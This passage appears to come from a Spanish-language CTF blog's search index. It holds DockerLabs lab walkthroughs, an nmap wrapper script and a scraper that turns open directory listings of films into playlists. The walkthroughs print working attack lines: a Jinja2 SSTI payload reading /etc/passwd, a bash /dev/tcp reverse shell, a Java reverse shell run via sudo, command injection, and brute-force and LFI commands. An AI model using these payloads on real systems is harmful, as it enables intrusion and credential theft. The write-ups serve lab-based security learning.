sstimap.py -u http://172.17.0.2:8089/\\?user\\= --interactiveUna vez abierto y conectado hago que me abra una sesion en la propia maquina.runosSi nos fijamos en la imagen de abajo podemos ver que poligloto utilizo este script para saber frente a que se encontrabaJinja2 plugin has confirmed injection with tag '*'Ya estamos dentro y somo el usuario verdejo , ahora empezemos buscando binarios scripts , lo que sea que nos permita escalar privelegios , yo como siempre empiezo con sudo -l.Tenemo el binario base 64 para ejecutar como root y searchbins nos dice que lee un fichero lo codifica y luego nos lo presentara decodificado.Pues bien para resolver este acertijo nos falta saber que archivo leer y si sudo se ejecuta como root debe ser algun archivo suyo tambien podemos leer shadow y tirar con john para extraer las contraseñas de ambos usuarios.Pero vamos a tratar de averiguar si teine clave ssh root.Tenemos suerte y nos la muestraUna vez la tenemos nos la copiamos a nuestra maquina y la preparamos para pasarle john y que nos de el passphrase que nos hace falta.Recordemos primero la hasheamos con ssh2john y posterior lanzamos john junto a rockyou.Una vez ya tenemos el passphrasse cambiamos los permisos del id_rsa e ingresamos.YA somo root y la maquina queda a nuestra disposicion.Muchas gracias por leer."
  },
  
  {
    "title": "Pinguinazo , DockerLabs",
    "url": "/posts/pinguinazo/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico, ssti",
    "date": "2024-05-21 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema,un server side template inyection , revshell y escalada.Herramientas y recursos usados  Nmap  Revsh...",
    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema,un server side template inyection , revshell y escalada.Herramientas y recursos usados  Nmap  Revshell java  revshellEnumeracionEmpezamos lanzando un nmap contra el objetivo .nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX pinguinazo 172.17.0.2  Reporte nmapPodemos ver claramente la version que corre  y el puerto por el que tenemos acceso al werkzeug 3.1 Revisamos la web y el titulo nos confirma esta creada con flask y por lo general flask usa el motor de plantillas jinja.”Django tambien lo usa”.Solo teniendo eso al alcanze hay que ver que vulberabilidad podria tener.Yo me volvi loco buscando como explotar eso estuve intentando quebrar el pin de la consola para tener acceso pero sin resultado dado que se necesitan recuperar varios datos del server y en esta version creo que es imposible de obtenerlos.Haber si hay suerte y mario nos arma una con esa vulnerabilidad, que quede con las ganas de aprenderla.Por tanto tiene que ser mas sencillo, pruebo a inyectar codigo html.Si se ha tragado el html podriamos probar a inyectar otro tipo de payload que no solo lo interprete si no que ejecute codigo , para ello probamos con un ssti dado que la info info obtenida de google nos dice que podria ser vulnerable.Comprobamos con una divison contra 0 y vemos que nos da error por tanto tenemos un ssti y podrmos lanzarnos una revshell desde ahi mismo.Podriamos leer ficheros pero teniendo solo el puerto 5000 abierto no nos sera de utilidad asi que nos mandamos un revshell.  Lectura de ficheros ejemplo.{{config.class.init.globals[‘os’].popen(‘cat /etc/passwd’).read()}}Explotacion e infiltracionLanzando revshell , como siempre primero a la escucha con nc.Yo me he creado un fichero html em mi maquina atacante con el contendio para mandarme una revshell despues lo pipeo a bash para que lo ejecute el server.Contenido del archivo html.bash -c 'exec bash -i &amp;&gt;/dev/tcp/192.168.0.112/443 &lt;&amp;1'Levantamos un server con python3 y lanzamos la orden desde la web.Ya estamos dentro de la maquina.EscaladaYo como siempre empiezo con sudo -l.Me toca buscar en la web porque nunca he realizado la escalada con java asi que al lio.Debemos de crear un fichero java con el contenido que creamos oportuno y lo ejecutamos con sudo.En este caso creamos un revshellpublic class shell {    public static void main(String[] args) {        Process p;        try {            p = Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/192.168.0.112/9001 0&gt;&amp;1\");            p.waitFor();            p.destroy();        } catch (Exception e) {}    }}Creamos el fichero con el contenido correcto yo lo llamo revshell.java y posteriormente ejecuto java con sudo llamando al script recien creado.Hasta aqui el pinguinazo que me volvio loco …….Gracias por leer."
  },
  
  {
    "title": "PingPong , DockerLabs",
    "url": "/posts/pingpong/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico",
    "date": "2024-05-19 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema, bypass en webshell, movimiento lateral a morir y escalada final.Herramientas y recursos usados  nm...",
    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema, bypass en webshell, movimiento lateral a morir y escalada final.Herramientas y recursos usados  nmap  searchbinsEnumeracionEmpezamos lanzando un nmap contra el objetivo .nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX pingpong 172.17.0.2  Reporte nmapComo podemos extraer del reporte de nmap disponemos de un servicio apache tanto por el 80 como por el 443 y un servicio por el 5000.Revisamos el 80 y el 443 sin exito pero en el 5000 tenemos suerte.Es una web que nos permite realizar ping. Abusamos de eso y probamos.Abusolocalhost &amp;&amp; cat /etc/passwdNos ponemos a la escucha y nos mandamos una revshell.Infiltracion y movimiento lateralEstamos dentro con el usario freddy.Nos movemos al usuario bobby con dpkg.Usamos searchbins para ver como se usa.Ahora como bobby lo mismo sudo y a ver que hay.Ahora podemos desplazarnos con php y sudo hasta la usuaria gladys.Ya somos gladys ahora sudo , find lo de siempre.Sudo funciono.Si os fijais en la imagen estan los paso para ser chocolatito incluida la contraseña que leemos del archivo en opt a traves del comando sudo.Ahora a hacer login con chocolatito.Ya somos chocolatito en una terminal con un funcionamiento fantasma , mas que nada pq no veo lo que escribo. :)Volvemos a realizar los mismos pasos.Sudo de nuevo.Abusamos de awkSi pensabamos que acabamos con el boss no es asi aun que llegar a root y tenemos la escala final con el binario sedEscalada finalA Abusar de sedMuchas gracias por llegar hasta aqui y leer.Divertida pero estresante con tanto movimiento."
  },
  
  {
    "title": "Olvida netflix hbo disney ....",
    "url": "/posts/vide2m3u/",
    "categories": "Software",
    "tags": "scripts, bash, scraping",
    "date": "2024-05-18 00:00:00 -0300",
    





    
    "snippet": "VIDEO TO M3U  Aporte antiguo pero aun vigente en muchas maquinas seguimos listando.En el siguiente script nos aprovechamos de que apache nos deje listar los directorios donde han subido peliculas o...",
    "content": "VIDEO TO M3U  Aporte antiguo pero aun vigente en muchas maquinas seguimos listando.En el siguiente script nos aprovechamos de que apache nos deje listar los directorios donde han subido peliculas o series.Para buscar lo que nos interesa podemos hacer uso de google-dorks os dejo un ejemplo sencillo.inurl: \"index of /cine\"Podeis complicarlo como querais ese dork a mi ese ya me aporta resultados.Tampoco abuseis de los dokrs pues son empleados en tecnicas para buscar fallos de seguridad y vulnerabilidades entre otras cosas y por lo tanto google esta al acechorepoHumilde scriptEs sencillo pero funcional , el modo de uso es simple solo debemos editar la vriable url introduciendo la direccion desde donde haremos el scraping web , la direcion la buscais haciendo uso de los dorks.#!/bin/bash# URL de la página web#url=\"https://tvinnov.online/Peliculas/\"url='http://pilarika.no-ip.org/Cine/Cine_01/'# Nombre del archivo de salidaoutput_file=\"videos.m3u\"# Obtener el contenido de la página webcontent=$(curl -s \"$url\")# Extraer los enlaces de video utilizando expresiones regularesvideo_links=$(echo \"$content\" | grep -Eo 'href=\"([^\"#]+\\.mp4)\"' | cut -d'\"' -f2)# Crear el archivo de salida y escribir los enlaces de videoecho \"#EXTM3U\" &gt; \"$output_file\"for link in $video_links; do  echo \"#EXTINF:0,$link\" &gt;&gt; \"$output_file\"  echo \"$url$link\" &gt;&gt; \"$output_file\"doneecho \"Se han extraído los enlaces de video y se han guardado en el archivo $output_file.\"Gracias y compartan"
  },
  
  {
    "title": "Picadilly , DockerLabs",
    "url": "/posts/picadilly/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico",
    "date": "2024-05-17 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema, decodificacion , webshell y escalada.Herramientas y recursos usados  nmap  dcode.frEnumeracionEmpe...",
    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema, decodificacion , webshell y escalada.Herramientas y recursos usados  nmap  dcode.frEnumeracionEmpezamos lanzando un nmap contra el objetivo .nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX picadilly 172.17.0.2  Reporte nmapComo vemos en el reporte de namp nos muestra dos web una en puerto 80 y otra en el 443.Revisamos la del puerto 80 primero y nos lista un archivo txt.DecodeandoDe esa nota extraemos un posible usuario y un posible password el cual esta codificado , en este punto nos vamos a dcodeDe  momento ya tenemos eso, para donde nos servira no tengo idea, asi que avanzamos hacia la web con ssl.InfiltracionDandole un vistazo rapido veo que permite tambien la subida de archivos asi que le tiro una webshell.php y la sube sin problemas asi que nos vamos al directorio uploads y la cargamos y nos ponemos en escucha para recibir la revshell.Una vez recibida la shell nos cambiamos rapidamente al usario maeto del cual obtuvimos el pass en dcode , hice todas posibles combinaciones y el unico resultado coherente  estaba mal ,hay que sacarle la x.Con sudo podemos escalar privilegios.Por otro lado no se que utilidad tiene que el archivo post.txt tenga permisos de ejecucion para todos.Aprevechemos php.EscaladaOtra completa gracias por leer comenten dudas o errores que veanSaludos…"
  },
  
  {
    "title": "Script escaneo nmap preconfigurado",
    "url": "/posts/nmap-command/",
    "categories": "Software",
    "tags": "scripts, nmap, bash",
    "date": "2024-05-17 00:00:00 -0300",
    





    
    "snippet": "Este script es una pequeña automatizacion de los comandos mas comunes y usales en los ctf’s de modo que no tengamos que tipear todo el comando.Va a estar en constante evolucion , cada vez que encue...",
    "content": "Este script es una pequeña automatizacion de los comandos mas comunes y usales en los ctf’s de modo que no tengamos que tipear todo el comando.Va a estar en constante evolucion , cada vez que encuentre un comando que nos ayude ire agreagndolo de a poco una vez este comprobada su utilidad para el aprendizaje que necesitamos.El script en cuestion es una ligera modificacion del que hizo el pinguino de mario , a mi personalmente me ayuda muchisimo el ver como otros han creado sus scripts , de hecho creo que es la forma correcta de aprender ,leer codigo y modifcarlo a tus necesidades.El modo de uso es muy simple ejecutas el script y el mismo te pide que le indiques la ip de la victima y el nombre del archivo de salida y posteriormente te crea un tambien un html porque  para mi esa es la mejor manera de visualizar los resultado de nmap.nmap_commandMaalfer#!/bin/bash#Configuramos los coloresrojo='\\e[0;31m\\033[1m'sincolor='\\033[0m'cyan_luminoso='\\033[1;36m'# Llamamos a esta función desde el trap finalizar SIGINT (En caso de que el usuario presione control + c para salir)finalizar() {    echo -e \"\\e[1;31m\\nFinalizando el script\\e[0m\"    exit}trap finalizar SIGINT#Comprobamos si es rootif [ $(id -u) -ne 0 ]; thenecho -e \"${rojo}Tienes que ser root para ejecutarlo.\"exitfi# Verificar si Nmap está instaladoif ! command -v nmap &amp;&gt; /dev/null; thenecho -e \"${cyan_luminoso}Nmap no está instalado.${sincolor}\"read -p \"¿Deseas instalar Nmap ahora? (s/n): \" respuestaif [[ $respuesta =~ ^[Ss]$ ]]; theninstalar_nmapelseecho -e \"${rojo}Nmap es necesario para ejecutar este script. Por favor, instala Nmap y vuelve a intentarlo.${sincolor}\"exitfifi# verificamos que distribucion linux este usandoinstalar_nmap() {distribucion=$(cat /etc/*-release | grep \"^ID=\" | awk -F'=' '{print $2}' | tr -d '\"')# Empezamos con la instalacionen para cada una de las distibuciones de linux.case $distribucion inubuntu|debian)apt-get updateapt-get install -y nmap;;centos|fedora)yum updateyum install -y nmap;;arch)pacman -Syu --noconfirm nmap;;*)echo -e \"${rojo}No se pudo determinar la distribución de Linux. Por favor, instala Nmap manualmente.${sincolor}\"exit;;esac}#Empezamos con las opciones de ejecucion de nmap , limpiamos pantalla y arrancamos.clearecho -e '┏┓╻┏┳┓┏━┓┏━┓   ┏━┓┏━╸┏━┓╻┏━┓╺┳╸   ┏━╸┏━┓┏━┓   ╺┳┓╻ ╻┏┳┓┏┳┓╻ ╻┏━┓┃┗┫┃┃┃┣━┫┣━┛   ┗━┓┃  ┣┳┛┃┣━┛ ┃    ┣╸ ┃ ┃┣┳┛    ┃┃┃ ┃┃┃┃┃┃┃┗┳┛┗━┓╹ ╹╹ ╹╹ ╹╹     ┗━┛┗━╸╹┗╸╹╹   ╹    ╹  ┗━┛╹┗╸   ╺┻┛┗━┛╹ ╹╹ ╹ ╹ ┗━┛    Script original por EL PINGUINO DE MARIO  https://github.com/maalfer   \\n  '  read -p \"Introduce la IP a escanear: \" ipread -p \"Indica el nombre de salida del archivo: \" nombrewhile true; doecho -e \"\\n1) Puertos abiertos con versiones y servicios \"echo \"2) Buscar en los 65535 sin versiones ni servicios\"echo \"3) Limitamos a los 100 puertos comunes\"echo \"4) Buscamos vulnerabilidades scripts nse por defecto en todos los puertos\"echo \"5) Escaneo de puertos UDP\"echo \"6) Hay firewall? probemos.\"echo \"7) For CTF'S.\"echo \"8) Enumeracion share samba\"echo \"9) Salir\"read -p \"Selecciona una opción: \" opcioncase $opcion in1)clear &amp;&amp; echo \"Escaneando...\" &amp;&amp; nmap -A $ip -oX $nombre &gt; $nombre.txt &amp;&amp; echo -e \"${cyan_luminoso}Guardando el archivo $nombre.txt${sincolor}\" &amp;&amp; xsltproc $nombre &gt; $nombre.html &amp;&amp; echo -e \"${cyan_luminoso}Convertido el archivo xml a html  ${sincolor}\"exit;;2)clear &amp;&amp; echo \"Escaneando...\" &amp;&amp; nmap -p- -open $ip -oX $nombre &gt; $nombre.txt &amp;&amp; echo -e \"${cyan_luminoso}Guardando el archivo $nombre.txt${sincolor}\" &amp;&amp; xsltproc $nombre &gt; $nombre.html &amp;&amp; echo -e \"${cyan_luminoso}Convertido el archivo xml a html  ${sincolor}\"exit;;3)clear &amp;&amp; echo \"Escaneando...\" &amp;&amp; nmap -p- --open --top-ports 100 $ip -oX $nombre &gt; $nombre.txt &amp;&amp; echo -e \"${cyan_luminoso}Guardando el archivo $nombre.txt${sincolor}\" &amp;&amp; xsltproc $nombre &gt; $nombre.html &amp;&amp; echo -e \"${cyan_luminoso}Convertido el archivo xml a html  ${sincolor}\"exit;;4)clear &amp;&amp; echo \"Escaneando...\" &amp;&amp; nmap -p- -sV $ip -oX $nombre &gt; $nombre.txt &amp;&amp; echo -e \"${cyan_luminoso}Guardando el archivo $nombre.txt${sincolor}\" &amp;&amp; xsltproc $nombre &gt; $nombre.html &amp;&amp; echo -e \"${cyan_luminoso}Convertido el archivo xml a html  ${sincolor}\"exit;;5)clear &amp;&amp; echo \"Escaneando...\" &amp;&amp; nmap -p- -sU $ip -oX $nombre &gt; $nombre.txt &amp;&amp; echo -e \"${cyan_luminoso}Guardando el archivo $nombre.txt${sincolor}\" &amp;&amp; xsltproc $nombre &gt; $nombre.html &amp;&amp; echo -e \"${cyan_luminoso}Convertido el archivo xml a html  ${sincolor}\"exit;;6)clear &amp;&amp; echo \"Escaneando...\" &amp;&amp; nmap -sA $ip -oX $nombre &gt; $nombre.txt &amp;&amp; echo -e \"${cyan_luminoso}Guardando el archivo $nombre.txt${sincolor}\" &amp;&amp; xsltproc $nombre &gt; $nombre.html &amp;&amp; echo -e \"${cyan_luminoso}Convertido el archivo xml a html  ${sincolor}\"exit;;7)clear &amp;&amp; echo \"Escaneando...\" &amp;&amp; nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn $ip -oX $nombre &gt; $nombre.txt &amp;&amp; echo -e \"${cyan_luminoso}Guardando el archivo $nombre.txt${sincolor}\" &amp;&amp; xsltproc $nombre &gt; $nombre.html &amp;&amp; echo -e \"${cyan_luminoso}Convertido el archivo xml a html  ${sincolor}\"exit;;8)clear &amp;&amp; echo \"Escaneando...\" &amp;&amp; nmap -p 139,445 --script smb-enum-shares $ip -oX $nombre &gt; $nombre.txt &amp;&amp; echo -e \"${cyan_luminoso}Guardando el archivo $nombre.txt${sincolor}\" &amp;&amp; xsltproc $nombre &gt; $nombre.html &amp;&amp; echo -e \"${cyan_luminoso}Convertido el archivo xml a html  ${sincolor}\"exit;;9)break;;*)echo -e \"${rojo}\\nOpción incorrecta, elige el tipo de escaneo correcto.\"${sincolor};;esacdoneAcepto sugerencias e ideas , me gustaria transformarlo y declarar funciones pero eso sera cuando sepa mas."
  },
  
  {
    "title": "DockerLabs , DockerLabs",
    "url": "/posts/dockerlabs/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico",
    "date": "2024-05-16 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema, enumeracion de directorios y ficheros , file bypass , revshell y escalada final.Herramientas y rec...",
    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema, enumeracion de directorios y ficheros , file bypass , revshell y escalada final.Herramientas y recursos usados  Nmap  feroxbuster  bypass en control de archivosEnumeracionEmpezamos lanzando un nmap contra el objetivo .nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX dockerlabs 172.17.0.2  Reporte nmapEn este caso solo nos da el 80 de apache, asi que revisamos la web.feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -e -x php,txt,html,jpg,js -u http://172.17.0.2/La web no nos aporto nada .Lanzamos Feroxbuster tenemos suerte y nos encuentra una carpeta uploads y un archivo php.BypassLa subida de archivos esta restringida solo permite zip , tenemos que bypasear eso.Yo probe añadiendo y modificando la extension sin suerte.webshell.zip.phpwebshell-php.zipwebshell.php%0d%0aNo funciono , recorde que en una maquina utilce un tipo de extensio que es de compresion en php acabado en PHARpharMe lanzo burpsuite y miro el accept encoding , no estoy seguro de que sirva pero podriamos trastear mas con el burp haciendo un ataque para ver que extensiones perimte (mi nivel de burp es 0,1) no se como hacer eso asi que pruebo manualmente a subir el .pharInfiltracionTenemos exito subiendolo con esa extension , asi que directos a la websshel que acabamos de subir para enviarnos directo una revshell amnuestra maquina.Como vemos en la imagen nos mandamos una revshell poniendos antes a la escucha.Una vez logueado hacemos lo oportuno.Vemos cosas prometedoras con sudo parece que algo nos deja hacer y tambien encotramos la nota.txt.Revisemos la nota.EscaladaEl fichero nos dice donde esta la clave de root y sudo nos daba dos opciones para leer ficheros como son grep y cut , hacemos uso de searchbins para ver como se explotaCreamos la variable de entorno hacia el archiovo que queremos leer y luego ejecutamos el comando sudo.Listo hasta aqui la maquina.Difundan y compartan.Muchas gracias por leer"
  },
  
  {
    "title": "Stranger , DockerLabs",
    "url": "/posts/stranger/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico",
    "date": "2024-05-14 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema, enumeracion de directorios ,desencriptacionHerramientas y recursos usados  Nmap  feroxbuster  file...",
    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema, enumeracion de directorios ,desencriptacionHerramientas y recursos usados  Nmap  feroxbuster  file  opensslEnumeracionEmpezamos lanzando un nmap contra el objetivo .nmap -p 21,22,80 -sCV  --min-rate 5000 172.17.0.2 -oX stranger  Reporte nmapComo podemos extraer del reporte de nmap disponemos de servicio ftp , apache y ssh.Revismos la web y lo primero que encointramos es un posible user.Lanzamos Feroxbuster en busca de directorios.feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -e -x php,txt,html,jpg,js -u http://172.17.0.2/Como vemos nos muestra varios archivos y carpeta que no veiamos.Tratemos de ver los dos archivos y revisemos esa nueva web, de la web podemos extraer lo que tambien podrian ser usuarios y passwords anotemos.En secret.html nos da isntruciones precisas asi que al lio con hydra.Mientra hydra trabaja revisamos el private.txt.wget http://172.17.0.2/strange/private.txtPara empezar no es un txt me devuelve cosas incoherentes.El comando file nos indica que son datos, no es asci por lo tanto diria que puede ser algo encriptado , le paso herramientas para estego y no lo reconoce.No hay problema hydra encontro la passs para el ftp asi que miremos por ahi.Hacemos login con los credenciales obtenidos de hydra y descargamos el fichero.OpensslTenemos el fichero private.txt y el .pem file nos dijo que eran datos y desde el ftp se nos dio una clave.Los ficheros pem,crt,key,ca,… para mi se asocian todos con ssl , ahora nos faltaria averiguar el algoritmo de codificacion.Y para mi conocimiento esta parte es prueba y error.A probar con openssl hasta que nos de resultado positivo.Despues de unos cuantos comandos sin exito y unas busquedas de google hallo el comando esquivo y resulta ser rsa.¿como se corfima en que esta encriptado?.prueba y error es una locura.openssl pkeyutl -decrypt -inkey private_key.pem -in private.txt -out contenidoTenemos exito y nos da un pass o eso quiero pensar.InfiltracionProbemos manualmente los login y el pass que tenemos.Probe con mweeler , primer user que nos dio en la web raiz “creo recordar” y estamos dentro.Una vez dentro hacemos uso de find , sudo, buscamos scripts para cambiar de usuario y no soi capaz de encontar nada con esos metodos.Listo usuarios haber quienes tienen sh.Como vemos en la salida del passwd admin tambien tiene cuenta local y no solo en ftp probemos a entrar con las credenciales que ya tenemos.Llegamos al fondo eso si , no sin complicaciones.Garcias por leer, si ves errores comenta yo tambien sigo aprendiendo.                    Posibles usuarios        Posibles passwords                            mwheeler        iloveu                    will        demogorgon                    demogorgon                             admin                     Muchas pistas falsas esta bueno asi hay que emplear un poco mas de logica no tanto lanzar comandos."
  },
  
  {
    "title": "Collections , DockerLabs",
    "url": "/posts/collections/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico",
    "date": "2024-05-14 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema, enumeracion de directorios , busqueda de dominio , wordpress lfi, movimiento lateral y escalada fi...",
    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema, enumeracion de directorios , busqueda de dominio , wordpress lfi, movimiento lateral y escalada final.Herramientas y recursos usados  Nmap  feroxbuster  wpscan  hydra sin exito con el form  mongoEnumeracionEmpezamos lanzando un nmap contra el objetivo .nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX collections 172.17.0.2  Reporte nmapComo podemos extraer del reporte de nmap disponemos de servicio ssh , apache y y una bbdd de mongodb.Revismos la web y lo primero que encontramos al acceder es la pagina por defecto de apache pero recordemos que nmap nos dijo que habia una db por tanto hay algo mas.Lanzamos Feroxbuster en busca de directorios.feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -e -x php,txt,html,jpg,js -u http://172.17.0.2/Como vemos nos muestra que hay un wordpress , al entrar a la nueva ruta vemos que no carga bien los estilos asi que miramos el codigo para ver el dominio.Lo añadimos a etc/hosts y lanzo wpscan para que busque vulnerabilidades y usuarios.Tenemos suerte y nos encuentra un user y nos indica que tenemos un local file inclusion, uno que ya conocemos de otra maquina ,esta vez voy a interntar otra forma de alcanzar el objetivo.PoCVamos a seguir haciendo fuerza bruta contra wordpress usando wpscanwpscan --url http://collections.dl/wordpress/ -U chocolate -P /home/quino/Descargas/rockyou/rockyou.txtTenemos login en wordpress ,  pero vamos al lfi antes de intentar acceder hemos de acostumbrarnos a mirar todo lo posible.Explotacion LFIDescargo un scrypt python desde lfiSiguo las instruciones y ejecuto buscando usuarios propios del sistema no de la web.python3 CVE-2018-7422.py -u http://collections.dl/wordpress/ -f /etc/passwd | grep /bin/bash  Automatiza un poco mas la tarea.Lo que vemos es que tenemos tres usarios en el sistema y tambien esta chocolate, primero contra el, y con la misma pass que en la web pero no tengo exito, asi que hydra.hydra -l chocolate -P ../../../../../quino/rockyou.txt ssh://172.17.0.2 -t 4Accedemos al sistema con los credenciales proporcionados.Ejecutamos los comandos tipicos y no nos proporcionan nada , recordemos que nmap nos dijo que habia un db asi que a ella accedemos con mongosh.Como es la primera vez que uso este tipo de base de datos me equivoque en un comando y al retroceder con la la flecha arriba para ver que comando habia ejecutado, no se pq aparecio el insert qu ele hizo mario a la bbdd asi que de momento me quedo sin saber como mostrar el contemido de esa tabla.La cuestion es que tengo otro user y pass.Nos monvemos al otro usuario.Como siempre probamos lo tipico sin exito .Antes de empezar a transferirnos algun archivo probamos las contraseñas que hemos obtenido y para sorpresa mia tenemos suerte , lo caul me ha sorprendido pq el usuario chocolate no tenia la misma en la web que en el sistema.Buena maquina e interesante pq no consegui acertar con el payloadcorrecto para reventar wordpress con hydra http-post-form.Gracias por leer."
  },
  
  {
    "title": "Fileception , DockerLabs",
    "url": "/posts/fileception/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico",
    "date": "2024-05-13 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema, steganografia en imagenes y otros ficheros, decodificacion.Herramientas y recursos usados  Nmap  s...",
    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema, steganografia en imagenes y otros ficheros, decodificacion.Herramientas y recursos usados  Nmap  stegseek  steghide  Cyberchef  strings  fileEnumeracionEmpezamos lanzando un nmap contra el objetivo .nmap -p 21,22,80 -sCV  --min-rate 5000 172.17.0.2 -oX nmapokReporte nmapComo podemos extraer del reporte de nmap disponemos de servicio ftp , apache y ssh.Como vemos nos va tocar recabar info de varios lugares asi que para empezar y dado que nmap dice que el ftp nos admite anonimos , vamos a ver que tenemos ahi.  Por cierto el fuzzing no me encontro nadaEntramos por ftp.Hay una imagen descargemosla.Al tratar de ver si hay algo me dice que no encuentra la palabra clave , es decir , la imagen esconde algo y ademas necesita de un codigo para ver el contenido.steganografiaEn el ftp no queda nada, a mirar la web , que creo es lo primero en comprabar pero bueno sigamos.Nos encontramos con la pagina de apache por defecto pero revisando el codigo fuente se ve que dejaron comentario.Primero nos dice un usario Peter y despues nos habla de estego osea confirma lo que sabiamos de la foto y despues nos da una clave que dice es base ..32..64..quien sabe , 64 no es eso seguro.Nos abrimos cyberchef y buscamos un resultado coherente con la pista que nos dio.Ya tenemos la clave para exponer el contenido de la imagen sin crakear nada , podemos extralo de forma habitual.Cual es mi sorpresa al extralo me encuentro con todo estoSan google amigos…Ahora que sabemos que es,  a decodificar ,yo voy a dcode.fr siempre me acuerdo de ella por un cifrado rosacruz que me encontre en otra maquina.Si recapitulamos tenemos el nombre de user y una password a ver si funcionanInfiltracionEstamos dentro, con peter ahora hacemos lo tipico hasta que encontremos algo.Vamos a tmp y encontramos dos archivos un txt y un odt , me descargo los dos lanzando python3.Miro el contenido de los dos y es el mismo salvo que me detecta algo raro el libre ofice cuando lanzo el odt.Revisamos mas a fondo ese archivo.Con strings tambien sacamos algo mas de info.Ahora que sabemos que es cambiamos la extension , descomprimimos y revisamos el contenido.En el segundo archivo que reviso tengo suerte me arroja usuario y un password en base64.echo -n 'ODBoMjM4MGgzNHVvdW8zaDQ=' | base64 -dHacemos ssh con octopus y el password decodeado y seguimos como siempre, directorio local , sudo , find …Con sudo tenemos todo ,listo….Enroscada la maquina esta no me imagino vuestras cabezas creando estos juegos en fin muchas gracias por ello.Aprender asi da gustoSaludos"
  },
  
  {
    "title": "Amor , DockerLabs",
    "url": "/posts/amor/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico",
    "date": "2024-05-13 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema, steganografia en imagenes y otros ficheros, decodificacion.Herramientas y recursos usados  Nmap  s...",
    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema, steganografia en imagenes y otros ficheros, decodificacion.Herramientas y recursos usados  Nmap  stegseekEnumeracionEmpezamos lanzando un nmap contra el objetivo .nmap -p 22,80 -sCV -n -oX amor 172.17.0.2Reporte nmapComo podemos extraer del reporte de nmap disponemos de servicio apache y ssh.Empezemos revisando la web.Estamos de suerte nos indica dos usarios ese mensaje.Espero que si juan fue despedido haya eliminado sus accesos, asi que hago fuerza bruta contra carlota.hydra -l carlota -P ../../../../rockyou.txt ssh://172.17.0.2 -t 4```![hydra](assets/amor/hydra.png) ## InfiltracionHacemos login con Carlota \"ojo con la password de la de ciberseguridad\" casa de herrero ...![login](assets/amor/ls.png)Como vemos no tiene sudo pero encontramos una carpeta con una imagen asi que la descargamos.Como por suerte en esta puso python lo hacemos sin mucho problemaUna vez tengamos la imagen ejecutamos.## Esteganografia```bashstegseek imagen.jpg ../../../../rockyou.txtComo vemos nos proporciona un archivo con un password codeado en bas64.Lo decodeamosecho 'ZXNsYWNhc2FkZXBpbnlwb24=' | base64 -dMovimiento lateralObtenemos una password y probamos a hacer login con oscar.Como vemos en la imagen de abajo los del departamento si eliminaron a Juan .Una vez logeados comprobamos lo tipico.Como vemos podemos hacer uso de ruby para hacernos root.Escalada finalEjecutamos ….Llego al final esta maquinitaGracias por leer compartan ,muchas gracias."
  },
  
  {
    "title": "BreakMySsh , DockerLabs",
    "url": "/posts/breakssh/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico",
    "date": "2024-05-11 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema  , explotacion de ssh , decryt md5 y login.Herramientas y recursos usados  Nmap  hydra  Python  Goo...",
    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema  , explotacion de ssh , decryt md5 y login.Herramientas y recursos usados  Nmap  hydra  Python  GoogleEnumeracionEmpezamos lanzando un nmap contra el objetivo .sudo nmap -p 1-100 --open -sC 172.17.0.2 -oX breaknmapReporte nmapNmap nos informa que solo tenemos el 22 abierto y con el nombre de la maquina ya tenemos claro que nos invita e explotar el servicio SSH de algun modo.Si lanzamos un nmap -sV nos dara la version que corre que es una 7.7.Ahora buscamos un script que nos permita realizar la tarea de enumeracion.ExplotacionEn este punto directamente hubiesemos podido tirar con hydra o similar, para hacer fuerza bruta contra el user y el pass.Yo personalmente prefiero tener alguno de esos dos datos , ademas la maquina para mi es para que aprendamos a manejar ese tipo de enumeracion.Tambien podriais con msfconsoleLink to exploitDescargenlo y sigan los pasos que indica el autor en github../CVE-2018-15473.py -p 22 -w ../../../../rockyou.txt  172.17.0.2Con el 